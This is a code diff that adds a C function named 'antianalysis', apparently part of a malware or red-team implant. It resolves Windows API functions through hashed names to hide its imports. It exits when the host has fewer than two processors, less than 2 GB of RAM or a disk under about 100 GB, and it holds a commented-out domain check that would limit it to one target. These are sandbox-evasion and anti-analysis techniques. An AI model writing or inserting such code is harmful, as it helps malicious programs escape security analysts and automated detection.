@@ -1,0 +1,85 @@
+#include "APIresolve.h"
+
+uint64_t antianalysis(void)
+{
+    int hash_ExitProcess = 0xb769339e;
+    int hash_GetSystemInfo = 0x8308eff6;
+    int hash_GlobalMemoryStatusEx = 0xe4b211f0;
+    int hash_CreateFileW = 0xeb96c610;
+    int hash_DeviceIoControl = 0x59440ce;
+    int hash_GetComputerNameExW = 0xd252a609;
+    int hash_wcscmp = 0x24b524b2;
+
+    uint64_t exitprocess_ptr = 0x00;
+    uint64_t getsysteminfo_ptr = 0x00;
+    uint64_t GlobalMemoryStatusEx_ptr = 0x00;
+    uint64_t CreateFileW_ptr = 0x00;
+    uint64_t DeviceIoControl_ptr = 0x00;
+    uint64_t GetComputerNameExW_ptr = 0x00;
+    uint64_t wcscmp_ptr = 0x00;
+
+    typedef VOID(WINAPI* EXITPROCESS)(DWORD);
+    typedef VOID(WINAPI* GETSYSTEMINFO)(LPSYSTEM_INFO);
+    typedef BOOL(WINAPI* GLOBALMEMORYSTATUSEX)(LPMEMORYSTATUSEX);
+    typedef HANDLE(WINAPI* CREATEFilEW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    typedef HANDLE(WINAPI* DEVICEIOCONTROL)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    typedef BOOL(WINAPI* GETCOMPUTERNAMEEXW)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
+    typedef INT(WINAPI* WCSCMP)(wchar_t*, wchar_t*);
+
+    // Get function pointers
+    getsysteminfo_ptr = getFunctionPtr(HASH_kernel32, hash_GetSystemInfo);
+    exitprocess_ptr = getFunctionPtr(HASH_kernel32, hash_ExitProcess);
+    GlobalMemoryStatusEx_ptr = getFunctionPtr(HASH_kernel32, hash_GlobalMemoryStatusEx);
+    CreateFileW_ptr = getFunctionPtr(HASH_kernel32, hash_CreateFileW);
+    DeviceIoControl_ptr = getFunctionPtr(HASH_kernel32, hash_DeviceIoControl);
+    GetComputerNameExW_ptr = getFunctionPtr(HASH_kernel32, hash_GetComputerNameExW);
+    wcscmp_ptr = getFunctionPtr(HASH_ntdll, hash_wcscmp);
+
+    // Validate function pointers returned successfully
+    if (getsysteminfo_ptr == 0x00 || exitprocess_ptr == 0x00 || GlobalMemoryStatusEx_ptr == 0x00 || CreateFileW_ptr == 0x00 || DeviceIoControl_ptr == 0x00 || GetComputerNameExW_ptr == 0x00 || wcscmp_ptr == 0x00) {
+        ((EXITPROCESS)exitprocess_ptr)(0);
+    }
+
+    // Check CPU
+    SYSTEM_INFO systemInfo;
+    ((GETSYSTEMINFO)getsysteminfo_ptr)(&systemInfo);
+    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+    if (numberOfProcessors < 2) {
+        ((EXITPROCESS)exitprocess_ptr)(0);
+    }
+
+    // Check for a minimum of 2 GB of RAM
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    ((GLOBALMEMORYSTATUSEX)GlobalMemoryStatusEx_ptr)(&memoryStatus);
+    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+    if (RAMMB < 2048) {
+        ((EXITPROCESS)exitprocess_ptr)(0);
+    }
+
+    // Check for > 100 GB hard drive
+    wchar_t lpFileName[] = {'\\', '\\', '.', '\\', 'P', 'h', 'y', 's', 'i', 'c', 'a', 'l', 'D', 'r', 'i', 'v', 'e', '0', 0x00,};
+    HANDLE hDevice = ((CREATEFilEW)CreateFileW_ptr)(lpFileName, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    DISK_GEOMETRY pDiskGeometry;
+    DWORD bytesReturned;
+    ((DEVICEIOCONTROL)DeviceIoControl_ptr)(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
+    DWORD diskSizeGB;
+    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+    if (diskSizeGB < 99) {
+        ((EXITPROCESS)exitprocess_ptr)(0);
+    }
+
+    COMPUTER_NAME_FORMAT NameType = ComputerNameDnsDomain;
+    wchar_t lpBuffer[256];
+    DWORD nSize = sizeof(lpBuffer);
+
+    /*
+    ((GETCOMPUTERNAMEEXW)GetComputerNameExW_ptr)(NameType, lpBuffer, &nSize);
+    wchar_t domain[] = {'m', 'y', 'd', 'o', 'm', 'a', 'i', 'n', '.', 'c', 'o', 'm', 0x00};
+    if (((WCSCMP)wcscmp_ptr)(lpBuffer, domain) != 0) {
+       ((EXITPROCESS)exitprocess_ptr)(2);
+    }
+    */
+    // No checks failed
+    return 1;
+}
